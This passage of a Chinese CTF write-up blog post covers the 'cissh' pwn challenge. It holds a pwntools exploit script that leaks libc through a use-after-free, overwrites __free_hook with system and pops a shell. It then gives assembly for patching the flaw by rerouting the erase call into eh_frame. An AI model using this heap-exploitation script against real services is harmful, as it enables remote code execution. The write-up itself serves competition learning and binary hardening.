class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'10.1.128.10'</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment">#p = process('./cissh')</span></span><br><span class="line">elf=ELF(<span class="string">'./cissh'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(conn)</span>:</span> <span class="comment">#add</span></span><br><span class="line">    p.sendlineafter(<span class="string">'$'</span>,conn)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vi</span><span class="params">(name,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'$'</span>,<span class="string">'vi '</span>+name)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'$'</span>,<span class="string">'rm '</span>+name)</span><br><span class="line">   </span><br><span class="line">cmd(<span class="string">"touch eeee"</span>)</span><br><span class="line">vi(<span class="string">"eeee"</span>,<span class="string">"c"</span>*<span class="number">0xff0</span>)</span><br><span class="line"><span class="comment">#free("eeee")</span></span><br><span class="line"><span class="comment">#cmd("cat ffff")</span></span><br><span class="line">cmd(<span class="string">"ln ffff eeee"</span>)</span><br><span class="line">free(<span class="string">"eeee"</span>)</span><br><span class="line">cmd(<span class="string">"ls"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"ffff"</span>)</span><br><span class="line">cmd(<span class="string">"cat ffff"</span>)</span><br><span class="line">cmd(<span class="string">"cat ffff"</span>)</span><br><span class="line"></span><br><span class="line">__malloc_hook=u64(p.recvline()[<span class="number">4</span>:<span class="number">12</span>])<span class="number">-0x70</span></span><br><span class="line">print(hex(__malloc_hook))</span><br><span class="line">libc_base=__malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">cmd(<span class="string">"touch gggg"</span>)</span><br><span class="line">vi(<span class="string">"gggg"</span>,<span class="string">"c"</span>*<span class="number">0x23</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">"touch hhhh"</span>)</span><br><span class="line">vi(<span class="string">"hhhh"</span>,<span class="string">"c"</span>*<span class="number">0x23</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd(<span class="string">"touch yyyy"</span>)</span><br><span class="line">vi(<span class="string">"yyyy"</span>,<span class="string">"c"</span>*<span class="number">0x23</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">"touch uuuu"</span>)</span><br><span class="line">vi(<span class="string">"uuuu"</span>,<span class="string">"c"</span>*<span class="number">0x23</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd(<span class="string">"touch defg"</span>)</span><br><span class="line">vi(<span class="string">"defg"</span>,<span class="string">"/bin/sh\x00/bin/sh\x00/bin/sh\x00/bin/sh\x00"</span>)</span><br><span class="line">cmd(<span class="string">"touch oooo"</span>)</span><br><span class="line">cmd(<span class="string">"touch kkkk"</span>)</span><br><span class="line">cmd(<span class="string">"touch llll"</span>)</span><br><span class="line">cmd(<span class="string">"touch jjjj"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="string">"gggg"</span>)</span><br><span class="line">free(<span class="string">"hhhh"</span>)</span><br><span class="line">free(<span class="string">"yyyy"</span>)</span><br><span class="line">free(<span class="string">"uuuu"</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">"touch dddd"</span>)</span><br><span class="line">vi(<span class="string">"dddd"</span>,<span class="string">"asdfasdfasdfasdf"</span>)</span><br><span class="line">cmd(<span class="string">"ls"</span>)</span><br><span class="line">cmd(<span class="string">"ln cccc dddd"</span>)</span><br><span class="line">cmd(<span class="string">"rm dddd"</span>)</span><br><span class="line">cmd(<span class="string">"cat cccc"</span>)</span><br><span class="line">vi(<span class="string">"cccc"</span>,p64(free_hook))<span class="comment">#  uaf,add every addr</span></span><br><span class="line"></span><br><span class="line">vi(<span class="string">"oooo"</span>,p64(free_hook)+<span class="string">b'a'</span>*<span class="number">0x19</span>)</span><br><span class="line">vi(<span class="string">"oooo"</span>,p64(system)+<span class="string">b'\x00'</span>*<span class="number">0x19</span>)</span><br><span class="line">vi(<span class="string">"oooo"</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free(<span class="string">"oooo"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">touch dddd</span></span><br><span class="line"><span class="string">vi dddd</span></span><br><span class="line"><span class="string">asdfasdfasdfasdf</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">ln cccc dddd</span></span><br><span class="line"><span class="string">rm dddd </span></span><br><span class="line"><span class="string">cat cccc</span></span><br><span class="line"><span class="string">#00 00 00 00  00 00 00 00  10 10 c9 11  bc 55 00 00</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>怎么说呢，pwn的时候👴就基本是看着功能全靠测，测出来的。但是patch的时候就很难顶了，所以👴只能打完比赛仔细看看怎么patch，顺便看看有啥c++通用patch方法🐎。</p>
+<p>这里关键的patch的地方在这里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000003BD8                 call    _ZN9__gnu_cxx17__normal_iteratorIPKSt10shared_ptrI4FileESt6vectorIS3_SaIS3_EEEC2IPS3_EERKNS0_IT_NS_11__enable_ifIXsrSt10__are_sameISC_SB_E7__valueES8_E6__typeEEE ; __gnu_cxx::__normal_iterator&lt;std::shared_ptr&lt;File&gt; const*,std::vector&lt;std::shared_ptr&lt;File&gt;&gt;&gt;::__normal_iterator&lt;std::shared_ptr&lt;File&gt;*&gt;(__gnu_cxx::__normal_iterator&lt;std::shared_ptr&lt;File&gt;*,__gnu_cxx::__enable_if&lt;std::__are_same&lt;std::shared_ptr&lt;File&gt;*,std::shared_ptr&lt;File&gt;*&gt;::__value,std::vector&lt;std::shared_ptr&lt;File&gt;&gt;&gt;::__type&gt; const&amp;)</span><br><span class="line">.text:0000000000003BDD                 mov     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000003BE1                 mov     rsi, rax</span><br><span class="line">.text:0000000000003BE4                 mov     rdi, rbx</span><br><span class="line">.text:0000000000003BE7                 call    _ZNSt6vectorISt10shared_ptrI4FileESaIS2_EE5eraseEN9__gnu_cxx17__normal_iteratorIPKS2_S4_EE ; std::vector&lt;std::shared_ptr&lt;File&gt;&gt;::erase(__gnu_cxx::__normal_iterator&lt;std::shared_ptr&lt;File&gt; const*,std::vector&lt;std::shared_ptr&lt;File&gt;&gt;&gt;)</span><br><span class="line">.text:0000000000003BEC                 jmp     short loc_3C2F</span><br></pre></td></tr></table></figure>
+
+<p>这里erase执行后就相当于c里面的free，所以我们就用c里patch uaf的方法来patch即可。</p>
+<p>首先修改段权限，我们找到pht_entry这里，由于我们要在eh_frame写代码，所以改这个段权限</p>
+<p>eh_frame的地址是0xc498，所以我们找到对应的pht_entry</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000000120 ; PHT Entry 4</span><br><span class="line">LOAD:0000000000000120                 dd 1                    ; Type: LOAD</span><br><span class="line">LOAD:0000000000000124                 dd 4                    ; Flags</span><br><span class="line">LOAD:0000000000000128                 dq 0B000h               ; File offset</span><br><span class="line">LOAD:0000000000000130                 dq offset _IO_stdin_used ; Virtual address</span><br><span class="line">LOAD:0000000000000138                 dq 0B000h               ; Physical address</span><br><span class="line">LOAD:0000000000000140                 dq 54CBh                ; Size in file image</span><br><span class="line">LOAD:0000000000000148                 dq 54CBh                ; Size in memory image</span><br><span class="line">LOAD:0000000000000150                 dq 1000h                ; Alignment</span><br></pre></td></tr></table></figure>
+
+<p>这里我们把124这个flag的位置原本的4改成7，即rwx即可。</p>
+<p>然后我们到call erase这个函数这里，patch成跳到eh_frame这里，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000003BDD                 mov     rax, [rbp-20h]</span><br><span class="line">.text:0000000000003BE1                 mov     rsi, rax</span><br><span class="line">.text:0000000000003BE4                 mov     rdi, rbx</span><br><span class="line">.text:0000000000003BE7                 jmp     loc_C498</span><br></pre></td></tr></table></figure>
+
+<p>然后先把对应的要free的chunk保存到r14和r15里，然后调用erase函数进行free操作，随后对存储内容的堆块进行清空操作，最后跳回对应的函数位置即可。</p>
+<p>通过对数据结构的分析我们知道，0x41的堆块+0x10的位置其实是存储文件内容地址和长度的，在文件的初始状态下，其实是指向该堆块+0x20的位置的，同时+0x18处的长度也为0。所以这里我们的目标其实就是在ln cccc dddd，rm dddd的操作后，让cccc的指向0x41堆块的指向内容清空，长度也清空。这里通过对数据结构的分析，我们很容易就能找到0x41堆块+0x10的位置，然后对其赋值为该堆块+0x20的位置，长度赋值为0即可。</p>
+<p>最终我们修改的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.eh_frame:000000000000C498 loc_C498:                               ; CODE XREF: Manager::rmFile(void)+DB↑j</span><br><span class="line">.eh_frame:000000000000C498                 mov     rax, [rdi]</span><br><span class="line">.eh_frame:000000000000C49B                 mov     rbx, [rax]</span><br><span class="line">.eh_frame:000000000000C49E                 add     rbx, 20h</span><br><span class="line">.eh_frame:000000000000C4A2                 mov     rax, [rbx]</span><br><span class="line">.eh_frame:000000000000C4A5                 mov     r14, rax</span><br><span class="line">.eh_frame:000000000000C4A8                 nop</span><br><span class="line">.eh_frame:000000000000C4A9                 mov     r15, r8</span><br><span class="line">.eh_frame:000000000000C4AC                 nop</span><br><span class="line">.eh_frame:000000000000C4AD                 nop</span><br><span class="line">.eh_frame:000000000000C4AE                 nop</span><br><span class="line">.eh_frame:000000000000C4AF                 nop</span><br><span class="line">.eh_frame:000000000000C4B0                 call    _ZNSt6vectorISt10shared_ptrI4FileESaIS2_EE5eraseEN9__gnu_cxx17__normal_iteratorIPKS2_S4_EE ; std::vector&lt;std::shared_ptr&lt;File&gt;,std::allocator&lt;std::shared_ptr&lt;File&gt;&gt;&gt;::erase(__gnu_cxx::__normal_iterator&lt;std::shared_ptr&lt;File&gt; const*,std::vector&lt;std::shared_ptr&lt;File&gt;,std::allocator&lt;std::shared_ptr&lt;File&gt;&gt;&gt;&gt;)</span><br><span class="line">.eh_frame:000000000000C4B5                 add     r15, 10h</span><br><span class="line">.eh_frame:000000000000C4B9                 nop</span><br><span class="line">.eh_frame:000000000000C4BA                 nop</span><br><span class="line">.eh_frame:000000000000C4BB                 nop</span><br><span class="line">.eh_frame:000000000000C4BC                 nop</span><br><span class="line">.eh_frame:000000000000C4BD                 mov     [r14], r15</span><br><span class="line">.eh_frame:000000000000C4C0                 mov     r8, 0</span><br><span class="line">.eh_frame:000000000000C4C7                 mov     [r14+8], r8</span><br><span class="line">.eh_frame:000000000000C4CB                 jmp     loc_3C2F</span><br></pre></td></tr></table></figure>
+
+<p>经过测试后，发现成功清空了堆块，在rm dddd之后cat cccc会显示无内容。（当然这里仅本地patch通过了，不知道天枢师傅的check脚本是怎么写的，所以比赛时能不能通过就不一定了。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>好饿啊，早知道不学安全了</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="1p0ch 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WP/" rel="tag"># WP</a>
+              <a href="/tags/%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9B/" rel="tag"># 国赛决赛</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/12/28/%E5%8D%8E%E4%B8%BAxctf%E7%AC%AC%E4%B8%89%E5%9C%BApwn/" rel="prev" title="xctf高校挑战赛2020-华为harmonyos和hms专场WP（pwn部分）">
+      <i class="fa fa-chevron-left"></i> xctf高校挑战赛2020-华为harmonyos和hms专场WP（pwn部分）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cissh"><span class="nav-number">1.</span> <span class="nav-text">cissh</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn"><span class="nav-number">1.1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">1.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#patch"><span class="nav-number">1.2.</span> <span class="nav-text">patch</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="1p0ch"
+      src="https://q2.qlogo.cn/headimg_dl?dst_uin=765986760&spec=160">
+  <p class="site-author-name" itemprop="name">1p0ch</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">36</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/1p0ch" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;1p0ch" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:mayedoushidalao@163.com" title="E-Mail → mailto:mayedoushidalao@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://wpa.qq.com/msgrd?v=3&uin=765986760&site=qq&menu=yes" title="QQ → https:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;765986760&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备20005978号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1p0ch</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">165k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:30</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
